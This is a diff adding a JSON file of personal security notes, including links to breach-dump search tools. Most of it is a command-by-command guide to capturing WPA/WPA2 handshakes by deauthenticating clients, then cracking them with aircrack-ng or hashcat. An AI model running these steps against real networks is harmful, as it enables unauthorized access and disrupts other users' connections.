@@ -1,0 +1,28 @@
+{
+  "notes": [
+    {
+      "id": "note1",
+      "title": "Network Security Basics",
+      "category": "Network Security",
+      "content": "<h2>Network Security Basics</h2><ul><li>Firewalls</li><li>VPNs</li><li>IDS/IPS</li><li>Common network security practices</li></ul>"
+    },
+    {
+      "id": "note2",
+      "title": "Useful Security Resources",
+      "category": "Security Policies & Governance",
+      "content": "<h2>Useful Security Resources</h2><ol><li><strong><a href=\"https://snipzy.dev\">snipzy.dev</a></strong>: For HTML, CSS, and JavaScript coding snippets.</li><li><strong><a href=\"https://hacksplaining.com\">hacksplaining.com</a></strong>: Free hacking training.</li><li><strong><a href=\"https://crt.sh/\">crt.sh</a></strong>: Check digital certificate information.</li><li><strong>Breach Data Dump Search Tools:</strong><ul><li><a href=\"https://github.com/Ekultek/WhatBreach\">WhatBreach</a></li><li><a href=\"https://github.com/woj-ciech/LeakLooker\">LeakLooker</a></li><li><a href=\"https://github.com/sham00n/buster\">Buster</a></li><li><a href=\"https://github.com/rndinfosecguy/Scavenger\">Scavenger</a></li><li><a href=\"https://github.com/davidtavarez/pwndb\">PwnDB</a></li></ul></li><li><strong>Email Breach Search Sites:</strong><ul><li><a href=\"https://haveibeenpwned.com\">haveibeenpwned.com</a></li><li><a href=\"https://www.f-secure.com\">f-secure.com</a></li><li><a href=\"https://www.hacknotice.com\">hacknotice.com</a></li><li><a href=\"https://breachdirectory.com\">breachdirectory.com</a></li><li><a href=\"https://keepersecurity.com\">keepersecurity.com</a></li></ul></li><li><strong><a href=\"https://morsecode.world/international/decoder/audio-decoder-adaptive.html\">Morse Code Audio Decoder</a></strong>: Site for sound decoding.</li></ol>"
+    },
+    {
+      "id": "note3",
+      "title": "Command to change USB to ntfs linux/windows readable",
+      "category": "System Commands",
+      "content": "<h2>Command to change USB to ntfs linux/windows readable</h2><div class=\"terminal-block\"><pre><code class=\"language-bash terminal\">$ sudo umount /dev/<device_id> 2>/dev/null\n$ sudo mkfs.ntfs -f -L \"<preferred_filename>\" /dev/<device_id>\n</code></pre></div>"
+    },
+    {
+      "id": "note4",
+      "title": "Cracking Wi-Fi passwords using packet capture (handshake capture), focusing on WPA/WPA2 networks",
+      "category": "Wi-Fi Security",
+      "content": "<h2>Cracking Wi-Fi passwords using packet capture (handshake capture), focusing on WPA/WPA2 networks</h2><pre><code class=\"bash\">---\ntitle: >-\n  Cracking Wi-Fi passwords using packet capture (handshake capture), focusing on\n  WPA/WPA2 networks\nupdated: 2025-07-18 13:56:21Z\ncreated: 2025-07-17 07:41:35Z\n---\n\nTools Used\n-\n- **Airodumb-ng -** Used for listing the wifi networks within your range. It is also used to collect the packets from the target network.\n- **Airmon-ng -** Used to chage the wifi adapter into monitor mode.\n- **Aircrack-ng -** Used for cracking the packet file to get the wifi password.\n- **Hashcat -** Used to get the password from the converted capture file to hccapx for the password.\n\n* * *\nProcedure\n-\n### **STEP 1: Check for Wi-Fi Adapter in your machine**\n\n```bash\niwconfig\n```\n\n* Look for an interface like `wlan0`.\n\n### **STEP 2: Check If Adapter Supports Monitor Mode**\n\n```bash\niw list | grep -A 10 \"Supported interface modes\"\n```\n\n* Look for `* monitor` under Supported Interface Modes.\n\n### **STEP 3: Put the Adapter into Monitor Mode**\n\n```bash\nsudo airmon-ng check kill             # Kill interfering processes\nsudo airmon-ng start wlan0            # Start monitor mode on wlan0\n```\n\n* This will start monitor mode, usually on `wlan0mon`.\n\n### **STEP 4: Scan for Nearby Wi-Fi Networks**\n\n```bash\nsudo airodump-ng wlan0mon\n```\n\n* Note:\n\n  * **BSSID** of target AP\n  * **Channel (CH)**\n  * **ESSID** (network name)\n\n### **STEP 5: Capture the WPA Handshake**\n\n```bash\nsudo airodump-ng -c [channel] --bssid [BSSID] -w [filename] wlan0mon\n```\n\n* Replace from the previous scan the details of the preferred target:\n\n  * `[channel]` → e.g., 6\n  * `[BSSID]` → target router MAC address\n  * `[filename]` → Your preferred name of capture file\n\n> Leave this running. Now deauthenticate a client to force handshake int a new terminal tab.\n\n\n### **STEP 6: Deauthenticate a Client to Capture Handshake**\n\n```bash\nsudo aireplay-ng -0 10 -a [BSSID] wlan0mon\n```\n\n* Optionally add `-c [client_MAC]` to target a specific user.\n* `-0 10` sends 10 deauth packets.\n\n### **STEP 7: Confirm Handshake Capture**\n\n* In `airodump-ng`, look top right for `[WPA handshake: xx:xx:xx:xx:xx:xx]`.\n\n### **STEP 8: Crack the Handshake File Using Wordlist**\n\n```bash\nsudo aircrack-ng [filename]-01.cap -w [wordlist.txt]\n```\n\n* Defaut linux location for wordlist: `/usr/share/wordlists/rockyou.txt`\n*  Paste the path to replace [wordlist.txt]\n*  If the path doesn't exist, installe it using the following commands:\n\t`sudo apt install wordlist` then unzip it.\n\n### **After the above command has runned, you will get the wifi password\n-\n\n### Alternatively: Using hachcat to crack the password\n-\n\n### Step 1: Convert .cap to .hccapx for Hashcat\n\n```bash\ncap2hccapx [file.cap] [file.hccapx]\n```\n\n* You need this format for Hashcat.\n\n### Step 2: Start Hashcat (WPA/WPA2 = mode 22000 or 2500)\n\n```bash\nhashcat -m 2500 -a 0 handshake.hccapx /usr/share/wordlists/rockyou.txt --force\n```\n\n* `-m 2500` → legacy WPA/WPA2\n* `-a 0` → dictionary attack\n* `--force` → skip warnings (optional)\n\n>  Modern WPA2 (PMKID) can use mode `22000` with `.hc22000` file (use `hcxpcapngtool` for conversion).\n</code></pre>"
+    }
+  ]
+}
